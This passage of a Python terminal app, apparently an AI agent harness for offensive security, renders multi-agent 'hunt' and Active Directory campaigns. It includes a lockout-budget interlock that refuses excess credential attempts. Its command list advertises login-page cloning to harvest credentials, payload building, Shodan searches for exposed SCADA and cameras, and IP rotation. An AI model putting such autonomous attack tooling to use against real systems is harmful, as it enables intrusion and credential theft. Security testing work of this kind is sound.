                carried = ev.get("findings") or []
                seed["findings"] = carried
                days = ev.get("age_days", 0)
                age = "today" if days == 0 else f"{days}d old"
                self._sys_line(
                    f"recon already done — reusing notes ({age}), "
                    f"planning from {len(carried)} earlier finding(s)",
                    ok=True)
                self._sys_line(f"  {ev.get('path', '')}")
                bar.set_activity("hunt: planning", busy=True)

            elif etype == "hunt_refused":
                # A wave with nothing to follow. `run_hunt` decided it, and this
                # is the one place the reason can be shown — the refusal happens
                # before recon, so there is no overlay to close and no wave to
                # unwind. Just the operator and the line telling them what to run.
                self._sys_line(f"⚠ {ev.get('message', 'refused')}", warn=True)
                bar.set_activity("idle", busy=False)

            elif etype == "hunt_recon_start":
                self._sys_line("recon — mapping the target…")
                bar.set_activity("hunt: recon", busy=True)
                # can_focus is False, so this screen never takes the keyboard
                # itself — but it does paint over the prompt, so /stop-hunt is
                # not typeable while recon runs. ctrl+c is (priority binding).
                # See WaveOverlay's docstring for the full explanation.
                try:
                    screen = ReconOverlay(ev.get("target", target), p, self.cfg)
                    overlay["screen"] = screen
                    self.push_screen(screen)
                except Exception:
                    overlay["screen"] = None

            elif etype == "hunt_recon_done":
                self._close_recon(overlay)
                text = (ev.get("text") or "").strip()
                if text:
                    chat.write_block(R.agent_line("recon", text, p.accent, p))
                # The recon notes are on disk, and the operator is told where:
                # the campaign directory accumulates them, so "save the
                # findings" has a real answer even before a wave reports.
                saved = (ev.get("saved") or "").strip()
                if saved:
                    self._sys_line(f"recon done — notes in {saved}", ok=True)
                else:
                    self._sys_line("recon done — planning wave 1", ok=True)

            elif etype == "hunt_wave_start":
                counter["wave"] = ev.get("wave", 0)
                # `size` is the concurrency cap the planner was *asked* for, not
                # the roster it returned, so it is the bar's denominator but not
                # the agent count — that only arrives with the plan, below.
                counter["total"] = ev.get("size", 0)
                counter["running"] = 0
                counter["done"] = 0
                counter["agents"] = 0
                if loop is not None:
                    loop.set_hunt(wave=counter["wave"], agents=0, done=0)
                chat.write_block(R.turn_marker(
                    self.agent.turn_count + counter["wave"], p))
                chat.write_block(R.user_prompt_block(
                    f"⚑ wave {counter['wave']} · {counter['total']} agents", p))
                # The web goes up with the wave. It is pushed before the plan
                # arrives, so the screen is already up and painting when the
                # roster lands — pushing on the plan instead would leave the
                # first agents' starts arriving at a screen that is not there.
                self._open_wave(web, target, counter["wave"], counter["total"])
                # Seed the tracker with what earlier campaigns confirmed, so the
                # rail opens showing the whole picture rather than filling in
                # only as this campaign reports. Consumed once — later waves
                # already have their own tracker state.
                if seed["findings"]:
                    screen = web["screen"]
                    if screen is not None:
                        try:
                            for f in seed["findings"]:
                                screen.note({"type": "hunt_finding",
                                             "finding": f})
                        except Exception:
                            pass
                    seed["findings"] = []

            elif etype == "hunt_plan":
                if ev.get("fell_back"):
                    self._sys_line(
                        "planner reply unreadable — using the fixed vector matrix",
                        warn=True)
                    # Show what it actually said. Without this the operator
                    # cannot tell a prose-wrapped reply from an empty turn from
                    # a prompt that needs rewriting.
                    raw = (ev.get("raw") or "").strip()
                    if raw:
                        head = raw[:400] + ("…" if len(raw) > 400 else "")
                        chat.write_block(R.agent_line("planner", head, p.amber, p))
                    else:
                        self._sys_line("  (the planner returned nothing)", warn=True)
                if ev.get("summary"):
                    self._sys_line(ev["summary"])
                # The roster is the only place the real agent count appears.
                counter["agents"] = len(ev.get("workers") or [])
                if loop is not None:
                    loop.set_hunt(wave=counter["wave"],
                                  agents=counter["agents"], done=0)
                names = ", ".join(w["name"] for w in ev.get("workers") or [])
                if names:
                    self._sys_line(f"launching {len(ev['workers'])} — {names}", ok=True)

            elif etype == "hunt_agent_start":
                counter["running"] += 1
                color = agent_color(ev.get("index", 0), p)
                colors[ev.get("name", "")] = color
                if loop is not None:
                    loop.set_hunt(wave=counter["wave"],
                                  agents=counter["agents"],
                                  done=counter["done"])
                brief = ev.get("brief", "")
                if len(brief) > 96:
                    brief = brief[:95] + "…"
                chat.write_block(R.agent_event_line(
                    ev["name"], color, "▸", brief, p))
                bar.set_activity(
                    f"hunt w{counter['wave']} {counter['running']}/{counter['total']}",
                    busy=True)

            elif etype == "hunt_agent_tool":
                chat.write_block(R.agent_event_line(
                    ev["name"], colors.get(ev.get("name", ""), p.dim),
                    ev.get("tool", "?"),
                    tools_mod.summarise_call(
                        ev.get("tool", ""), ev.get("args") or {}, self.cfg), p))

            elif etype == "hunt_agent_text":
                # The worker's own reasoning. Dropped before, which meant the
                # transcript showed commands with no explanation of why they
                # were run.
                chat.write_block(R.agent_line(
                    ev["name"], ev.get("text", ""), p.dim, p))

            elif etype == "hunt_agent_result":
                # The other half of the call above: what the command actually
                # returned. Rendered as the same panel a normal turn uses, so
                # the operator sees the real command and the real response.
                if ev.get("blocked"):
                    chat.write_block(R.blocked_block(ev.get("output", ""), p))
                else:
                    chat.write_block(R.hunt_tool_panel(
                        ev.get("tool", "?"), ev.get("args") or {},
                        ev.get("output", ""), p,
                        agent=ev.get("name", ""),
                        color=colors.get(ev.get("name", ""), ""),
                        is_error=not ev.get("ok"),
                        meta=ev.get("meta") or {}))

            elif etype == "hunt_agent_done":
                counter["running"] = max(0, counter["running"] - 1)
                counter["done"] += 1
                if loop is not None:
                    loop.set_hunt(wave=counter["wave"],
                                  agents=counter["agents"],
                                  done=counter["done"])
                if not ev.get("ok"):
                    self._sys_line(
                        f"  {ev['name']} failed — {ev.get('error', 'unknown')}",
                        warn=True)

            elif etype == "hunt_finding":
                f = ev.get("finding") or {}
                sev = str(f.get("severity") or "info").upper()
                chat.write_block(R.agent_event_line(
                    f.get("agent", "?"), p.accent,
                    "◆" if ev.get("saved") else "·",
                    f"[{sev}] {f.get('title', '')}"
                    + (f"  ·  saved" if ev.get("saved") else ""),
                    p, ok=bool(ev.get("saved"))))
                # Keep the tracker in step with the transcript. It reads the
                # run's own list, so a finding the tracker already had is not
                # added twice.
                self._refresh_findings()

            elif etype == "hunt_wave_end":
                # The wave is over, so the web comes down and the transcript —
                # which has the whole wave's tool output in it — is readable
                # again. Popped here rather than at the next wave start so the
                # operator gets the transcript back while the planner thinks.
                self._close_wave(web)
                # Every agent has reported, so `done` is already the roster
                # size. Leave it — forcing it to the concurrency cap would show
                # a wave that planned three agents as 10/10.
                if loop is not None:
                    loop.set_hunt(wave=counter["wave"],
                                  agents=counter["agents"],
                                  done=counter["done"])
                self._hunt_tokens = (
                    self._hunt_tokens[0] + (ev.get("input") or 0),
                    self._hunt_tokens[1] + (ev.get("output") or 0),
                    self._hunt_tokens[2] + (ev.get("cost") or 0.0),
                )
                self._sys_line(
                    f"wave {ev['wave']} done — {ev['ok']}/{ev['agents']} ok, "
                    f"{ev['found']} finding(s)  ·  ${ev['cost']:.4f}",
                    ok=True)

            elif etype == "hunt_summary_done":
                chat.write_block(R.agent_line("summary", ev.get("text", ""), p.accent, p))
                self._sys_line(f"report archived: {ev.get('path')}", ok=True)

            elif etype == "hunt_end":
                self._sys_line(
                    f"hunt ended — {ev['wave']} wave(s), {ev['findings']} finding(s), "
                    f"{ev['saved']} report(s) in {ev['directory']}",
                    ok=True)
                self._register_hunt(ev)
                # The campaign is over; if the tracker is open it becomes a
                # record of the run rather than a live view.
                if self._findings_panel is not None:
                    self._findings_panel.live = False
                    self._refresh_findings()

        spinner = asyncio.create_task(self._verb_spinner())

        try:
            await hunt_mod.run_hunt(
                self.cfg, target,
                on_event=on_event,
                agent_factory=self._team_agent_factory,
                stop=self._hunt_stop,
                summary_flag=lambda: self._hunt_summary_queued,
                run=self._hunt_run,
                fresh=fresh,
                wave_number=wave_number,
                kind=kind,
            )
            # A summary asked for but never delivered — the hunt was stopped
            # between the request and a wave boundary. Offer it now rather than
            # silently dropping it.
            if self._hunt_summary_queued:
                self._hunt_summary_queued = False
                self._sys_line("summary was queued but never ran — use /summary-hunt")
        except asyncio.CancelledError:
            raise
        except Exception as e:  # noqa: BLE001
            chat.write_block(R.error_block(
                f"hunt failed: {type(e).__name__}: {e}", p))
        finally:
            spinner.cancel()
            # A stop or a crash during recon must not leave the window up over
            # a dead campaign — and the same for a wave stopped mid-flight, so
            # both overlays come down here.
            self._close_recon(overlay)
            self._close_wave(web)
            self.busy = False
            self._hunt_run = None
            chat.clear_stream()
            chat.card_finish()
            self._stream_buf = ""
            bar.set_activity("idle", busy=False)
            bar.input_tokens = self.agent.session_input_tokens + self._hunt_tokens[0]
            bar.output_tokens = self.agent.session_output_tokens + self._hunt_tokens[1]
            bar.cost = self.agent.session_cost + self._hunt_tokens[2]
            bar.turns = self.agent.turn_count
            bar.model = self.cfg.display_model
            bar.render_bar()
            # Hand the rail back to the main agent. Three separate calls
            # because each owns one thing: set_hunt drops the campaign
            # counters, set_stage clears HACK, and _sync_rails pushes the
            # session totals back in. Nothing else does the second one — the
            # stage is set by the turn runner, and the hunt is not a turn, so
            # without it the rail stayed lit on HACK after the campaign ended.
            if loop is not None:
                loop.set_hunt(None)
                loop.set_stage("idle")
            self._sync_rails()
            self._set_rain(self.rain_on)
            self.query_one("#input", Input).focus()
            # Last, and inside the finally, so it runs on a campaign that
            # crashed exactly as it does on one that finished. The callback owns
            # its own exceptions: a reporting seam that took the app down over a
            # formatting error would be worse than the silence it replaced.
            if on_finish is not None:
                try:
                    on_finish()
                except Exception:  # noqa: BLE001
                    pass

    def _run_ad(self, domain: str, *, probes, fresh: bool = False,
                wave_number: int | None = None,
                lockout: int = ad_mod.DEFAULT_LOCKOUT,
                armed: bool = False) -> None:
        """`/ad` — build the doctrine, then run the campaign engine on it.

        A thin wrapper over ``_run_hunt``, and deliberately so: recon, the wave
        web, the tracker rail, the stop flag and the closing report are the
        engine's. What `/ad` adds is the interlock and one extra sink.

        The sink is the reason this is a method rather than three lines at the
        call site. ``on_refuse`` is called from *inside* the tool hook — that is
        to say, on the campaign's own coroutine, at the moment a command was
        refused, before the agent is handed the refusal text. It can therefore
        write the line to the transcript the instant the breaker trips, rather
        than the operator inferring it from a wave that went quiet. It writes
        straight to the ChatPane rather than through a message, which is safe
        here for the same reason the whole ``on_event`` sink is: this runs on
        the app's own task, and every other writer to that pane does too.

        **A fresh ``ad_kind()`` per campaign, never the module-level
        ``AD_KIND``.** The interlock holds a throttle and an attempt counter,
        and those belong to one run: a shared kind would carry the first
        campaign's spent budget into the second and refuse it early.
        """
        p = self.palette
        chat = self.query_one(ChatPane)

        # The breaker's own state, read back for the closing line. Held here
        # rather than on the app because it is this campaign's, and a second
        # `/ad` must start from zero.
        spent = {"n": 0, "tripped": False, "lockout": lockout, "limit": max(1, lockout - 1)}

        def on_refuse(verdict, command: str) -> None:
            """The interlock refused a command. Say so, in the transcript.

            The agent is about to be handed the same refusal as a tool error
            and will adapt, so this is for the *operator*: a refusal is the
            interlock doing its job, and it must be visible at the moment it
            happens. Ten agents interleave, and a wave that quietly stopped
            trying would otherwise be indistinguishable from one that finished.
            """
            if verdict.destructive:
                head = "write refused"
            else:
                head = "credential attempt refused"
            t = Text()
            t.append("  ⛔ ", style=f"bold {p.red}")
            t.append(f"{head} — ", style=f"bold {p.red}")
            t.append(f"{verdict.reason}\n", style=p.amber)
            t.append("     ", style=p.dim)
            t.append(command.strip()[:160], style=p.dim)
            t.append("\n", style=p.dim)
            chat.write_block(t)

        def report_refusal(verdict, command: str) -> None:
            """Record it for the closing line, then say it."""
            if not verdict.destructive:
                spent["n"] += 1
            on_refuse(verdict, command)

        kind = ad_mod.ad_kind(
            lockout=lockout, armed=armed, probes=probes,
            on_refuse=report_refusal,
        )

        def on_finish() -> None:
            """The campaign is over — say what the interlock did.

            Including "nothing", because a run that never touched the budget is
            a fact worth stating: it is the difference between an
            unauthenticated sweep and a campaign that spent its four attempts.
            """
            if spent["n"] == 0:
                self._sys_line(
                    f"interlock: no credential attempt was refused — the "
                    f"budget of {spent['limit']} went unspent", ok=True)
            else:
                self._sys_line(
                    f"interlock: {spent['n']} credential command(s) refused "
                    f"against a lockout of {spent['lockout']}", warn=True)

        self._run_hunt(domain, fresh=fresh, wave_number=wave_number,
                       kind=kind, on_finish=on_finish)

    def _register_hunt(self, ev: dict) -> None:
        """Tell the main agent a campaign just finished, and where it landed.

        A hunt runs on its own Agent instances, so the main agent sees none of
        it. Without this, "save the findings" reached an agent with no idea a
        hunt had happened — and it answered "nothing found" over a directory
        full of evidence. The campaign directory and its counts go into the main
        agent's context so the next turn already knows, whether or not the model
        thinks to call ``hunt_findings``.
        """
        directory = ev.get("directory") or ""
        if not directory:
            return
        findings = ev.get("findings", 0)
        # Named from the campaign's own doctrine rather than hardcoded: the main
        # agent is told what was run, and an AD campaign described as
        # `/bug-hunt` would have it look in the wrong directory.
        command = ev.get("command") or "bug-hunt"
        summary = (
            f"[hunt] A /{command} campaign just ended against {self._hunt_target or 'the target'}.\n"
            f"directory: {directory}\n"
            f"waves: {ev.get('wave', 0)} · findings: {findings} · "
            f"reports saved: {ev.get('saved', 0)}\n"
            "Everything the campaign recorded — the findings, the recon notes "
            "and each wave's plan — is in that directory. Use the hunt_findings "
            "tool, or read_file on a path under it, before saying nothing was "
            "found."
        )
        try:
            self.agent.notice(summary)
        except Exception:  # noqa: BLE001
            pass

    def _open_wave(self, slot: dict, target: str, wave: int, size: int) -> None:
        """Raise the wave web for a new wave, replacing any that is still up.

        Replacing rather than refusing matters for a two-wave campaign: the
        previous web is popped at its own wave_end, but a stop or an error can
        skip that, and pushing on top would leave two webs stacked with the
        older one swallowing the events meant for the newer.
        """
        self._close_wave(slot)
        try:
            screen = WaveOverlay(target, self.palette, wave=wave, size=size)
            slot["screen"] = screen
            self.push_screen(screen)
        except Exception:
            slot["screen"] = None

    def _close_wave(self, slot: dict) -> None:
        """Take the wave web down, if it is still up.

        Same identity-checked removal as ``_close_recon``, and for the same
        reasons — see ``_drop_screen``. A blind ``pop_screen()`` would dismiss
        whatever the operator opened on top, and a wave that ends in the tick it
        started is popped the moment it is on top rather than a tick later, when
        the next wave's web may already have been pushed above it.
        """
        screen = slot.get("screen")
        slot["screen"] = None
        if screen is None:
            return
        self._drop_screen(screen)

    def _close_recon(self, overlay: dict) -> None:
        """Take the recon window down, if it is still up.

        Popped by identity rather than with a bare ``pop_screen()``: between the
        push and this call the operator can open the command palette or hit a
        permission modal, and a blind pop would dismiss *that* instead — leaving
        the recon window stranded over the shell. Idempotent, because both the
        recon-done event and the worker's ``finally`` call it.
        """
        screen = overlay.get("screen")
        overlay["screen"] = None
        if screen is None:
            return
        self._drop_screen(screen)

    def _drop_screen(self, screen, tries: int = 3) -> None:
        """Remove *screen* from the stack, wherever it sits.

        Popped the moment it is on top, even if it has not mounted. This used to
        defer a tick, on the theory that popping an unmounted screen tore the
        widget tree down ahead of the queued Mount message — but Textual 8.2.8
        pops it cleanly (``ReconOverlay.on_mount`` keeps its ``NoMatches`` guard
        for the general case), and the deferral cost far more than it bought: the
        callback re-checks ``self.screen is screen`` when it finally runs, and by
        then ``hunt_wave_start`` has pushed the wave web on top, so the check
        fails and recon is left on the stack for the whole campaign — with a
        fresh wave web stacked above it every wave.

        When it is genuinely not on top, the retry is bounded and identity
        checked, because whatever is above it — a permission modal, the command
        palette — is transient and will go on its own. A blind ``pop_screen()``
        would dismiss that instead, which is the fault this exists to avoid.
        """
        try:
            if screen not in self.screen_stack:
                return
            if self.screen is screen:
                self.pop_screen()
            elif tries > 0:
                self.call_after_refresh(self._drop_screen, screen, tries - 1)
        except Exception:
            pass

    def _drain_peer_inbox(self) -> str:
        """Unread pane messages, formatted for the start of the next turn."""
        from .. import panes as _panes

        session = _panes.current_session()
        me = _panes.current_agent()
        if not session or not me:
            return ""
        root = _panes.mailbox_root(self.cfg.state_dir, session)
        _panes.register(root, me)
        msgs = _panes.drain(root, me)
        if not msgs:
            return ""
        return ("[messages from other ZimZilla panes]\n"
                + _panes.format_messages(msgs))

    def _team_agent_factory(self, cfg: Config, **kw) -> Agent:
        """Build a team Agent. The seam tests replace to stub the model.

        Every worker gets its own Agent and its own Config copy — see
        zimzilla/team.py for why sharing one would clobber the scope guard.
        """
        return Agent(cfg, permission_handler=self.request_permission, **kw)

    # ---- command palette --------------------------------------------------
    def action_palette(self) -> None:
        """Ctrl+K: every action, fuzzy-searchable."""
        if self.busy:
            self._sys_line("harness is busy — Ctrl+C to interrupt", warn=True)
            return
        self.push_screen(CommandPalette(self._palette_entries(), self.palette),
                         self._palette_done)

    def _palette_entries(self) -> list[PaletteEntry]:
        """Build the action list. Each entry closes over what it needs."""
        entries: list[PaletteEntry] = []

        # Commands — derived from the same table _handle_command dispatches on,
        # so the palette cannot drift out of sync with the slash commands.
        commands = [
            ("/help", "command reference", "help"),
            ("/mode", "switch mode", "mode"),
            ("/model", "show or switch the model", "model"),
            ("/cost", "session token and cost breakdown", "cost"),
            ("/scope", "scope guard status", "scope"),
            ("/rain", "toggle the matrix rain", "rain"),
            ("/think", "show the model's reasoning", "think"),
            ("/effort", "raise or lower how hard the model thinks", "effort"),
            ("/theme", "switch palette", "theme"),
            ("/zim-source", "upstream sources and status", "zim-source"),
            ("/zim-tokenharbour", "switch upstream to TokenHarbour", "zim-tokenharbour"),
            ("/tokenjuice-api-setup", "your own Token Juice key, or the shared one",
             "tokenjuice-api-setup"),
            ("/zim-openrouter", "switch upstream to OpenRouter", "zim-openrouter"),
            ("/zim-unorouter", "switch upstream to UnoRouter", "zim-unorouter"),
            ("/zim-aihubmix", "switch upstream to AIHubMix", "zim-aihubmix"),
            ("/zim-beatapi", "switch upstream to BeatAPI", "zim-beatapi"),
            ("/zim-iteracompute", "switch upstream to IteraCompute", "zim-iteracompute"),
            ("/zim-infronai", "switch upstream to InfronAI", "zim-infronai"),
            ("/zim-antseed", "switch upstream to AntSeed", "zim-antseed"),
            ("/antseed-models", "AntSeed's free models, and the peer to pin",
             "antseed-models"),
            ("/tokenharbour-api-setup", "store your TokenHarbour API key",
             "tokenharbour-api-setup"),
            ("/tokenharbour-models", "fetch the live catalog; show what is free",
             "tokenharbour-models"),
            ("/openrouter-api-setup", "store your OpenRouter API key",
             "openrouter-api-setup"),
            ("/unorouter-api-setup", "store your UnoRouter API key",
             "unorouter-api-setup"),
            ("/unorouter-models", "the live free catalog — what is free and usable",
             "unorouter-models"),
            ("/aihubmix-api-setup", "store your AIHubMix API key",
             "aihubmix-api-setup"),
            ("/aihubmix-models", "the live free catalog — what is free and usable",
             "aihubmix-models"),
            ("/beatapi-api-setup", "store your BeatAPI API key",
             "beatapi-api-setup"),
            ("/beatapi-models", "the live free catalog — what is free and usable",
             "beatapi-models"),
            ("/iteracompute-api-setup", "store your IteraCompute API key",
             "iteracompute-api-setup"),
            ("/iteracompute-models", "the live free catalog — what is free and usable",
             "iteracompute-models"),
            ("/infronai-api-setup", "store your InfronAI API key",
             "infronai-api-setup"),
            ("/infronai-models", "the live free catalog — what is free and usable",
             "infronai-models"),
            ("/zim-nvidia", "switch upstream to NVIDIA NIM", "zim-nvidia"),
            ("/nvidia-api-setup", "store your NVIDIA API key (free dev tier)",
             "nvidia-api-setup"),
            ("/nvidia-models", "the live catalog — what this harness can drive",
             "nvidia-models"),
            ("/models", "free models of an upstream — /models [source]", "models"),
            ("/logfare-api-setup", "use your own Logfare key (the shipped one is shared)",
             "logfare-api-setup"),
            ("/logfare-models", "fetch the live catalog; show what is up",
             "logfare-models"),
            ("/ldxhub-api-setup", "store your LDXHub API key",
             "ldxhub-api-setup"),
            ("/ldxhub-models", "LDXHub models/engines — pick the default per service",
             "ldxhub-models"),
            ("/panes", "re-open this session under tmux", "panes"),
            ("/zim-opencode", "open opencode behind a fresh rotating IP",
             "zim-opencode"),
            ("/save", "write the session to disk", "save"),
            ("/load", "restore a saved session", "load"),
            ("/compact", "summarise history to free context", "compact"),
            ("/limits", "context window, round caps and timeouts", "limits"),
            ("/team", "fan the task out across parallel agents", "team"),
            ("/osint", "open-source recon on a target", "osint"),
            ("/osint-tree", "re-show a finished recon as a result tree", "osint"),
            ("/leadgen", "local leads: passive audit + outreach drafts",
             "leadgen"),
            ("/shodan-api-setup", "store your Shodan API key", "shodan-api-setup"),
            ("/shodan-cam-search", "exposed IP cameras, then analyse the result",
             "shodan-cam-search"),
            ("/shodan-scada-search", "exposed ICS / SCADA", "shodan-scada-search"),
            ("/shodan-db-search", "exposed databases", "shodan-db-search"),
            ("/shodan-rdp-search", "exposed RDP and VNC", "shodan-rdp-search"),
            ("/shodan-router-search", "exposed routers, firewalls and VPNs",
             "shodan-router-search"),
            ("/shodan-vuln-search", "hosts with a known CVE", "shodan-vuln-search"),
            ("/shodan-search", "any Shodan query, then analyse", "shodan-search"),
            ("/phish", "clone a login page and harvest creds", "phish"),
            ("/payload", "build a payload for a file extension", "payload"),
            ("/bug-hunt", "recon, then one wave of 10 agents", "bug-hunt"),
            ("/ad", "Active Directory campaign — gated and interlocked", "ad"),
            ("/crack", "crack hashes offline — CPU only, budgeted", "crack"),
            ("/stop-hunt", "end a running hunt", "stop-hunt"),
            ("/summary-hunt", "the hunt report — what each wave did", "summary-hunt"),
            ("/report-bug-hunt", "evidence-only report, every wave", "report-bug-hunt"),
            ("/findings", "the hunt finding tracker", "findings"),
            ("/clear", "wipe transcript and history", "clear"),
            ("/exit", "leave the harness", "exit"),
        ]
        for title, hint, key in commands:
            entries.append(PaletteEntry(
                key=f"cmd:{key}", title=title, hint=hint, group="command",
                run=(lambda k=key: self._handle_command("/" + k)),
            ))

        # Modes.
        for name, spec in MODES.items():
            entries.append(PaletteEntry(
                key=f"mode:{name}", title=f"mode {name}",
                hint=spec["blurb"], group="mode",
                run=(lambda n=name: self._set_mode(n)),
            ))

        # Themes.
        for name in THEME_NAMES:
            entries.append(PaletteEntry(
                key=f"theme:{name}", title=f"theme {name}", group="theme",
                run=(lambda n=name: self._cmd_theme([n])),
            ))

        # Models, capped: the catalog can be long and the palette is a shortcut,
        # not a replacement for /model.
        try:
            models = sources_mod.models_for(self.cfg.base_url) or tuple(KNOWN_MODELS)
        except Exception:
            models = tuple(KNOWN_MODELS)
        for name in models[:24]:
            pin, pout = price_for(name)
            entries.append(PaletteEntry(
                key=f"model:{name}", title=name,
                hint=f"${pin:.2f}/${pout:.2f} per Mtok", group="model",
                run=(lambda n=name: self._cmd_model([n])),
            ))

        # Files, so the palette can also be a "jump to" — the action inserts the
        # @mention into the prompt rather than submitting it.
        try:
            for path in _iter_files(self.cfg.workdir, limit=120)[:120]:
                entries.append(PaletteEntry(
                    key=f"file:{path}", title=path, group="file",
                    run=(lambda pth=path: self._mention_file(pth)),
                ))
        except Exception:
            pass

        return entries

    def _mention_file(self, path: str) -> None:
        """Drop an @mention into the prompt, cursor at the end."""
        inp = self.query_one("#input", Input)
        inp.value = f"@{path} "
        inp.cursor_position = len(inp.value)
        inp.focus()

    def _palette_done(self, entry: PaletteEntry | None) -> None:
        if entry is None or entry.run is None:
            self.query_one("#input", Input).focus()
            return
        # The screen is gone by the time this runs; run the action directly.
        entry.run()
        self.query_one("#input", Input).focus()

    # ---- key actions ------------------------------------------------------
    def action_interrupt(self) -> None:
        if not self.busy:
            self._sys_line("nothing to interrupt")
            return
        self._cancelled = True
        # If a permission modal is open, dismiss it so the turn can unwind
        # instead of hanging on an unanswered future.
        if isinstance(self.screen, PermissionModal):
            self.query_one("#input", Input).disabled = False
            self.screen.dismiss("no")
        # Also stop a pending turn worker promptly.
        try:
            self.workers.cancel_all()
        except Exception:
            pass
        self._sys_line("interrupt requested…", warn=True)

    def action_clear(self) -> None:
        self._cmd_clear()

    def action_quit(self) -> None:
        try:
            phish_mod.stop()
        except Exception:
            pass
        self.exit()
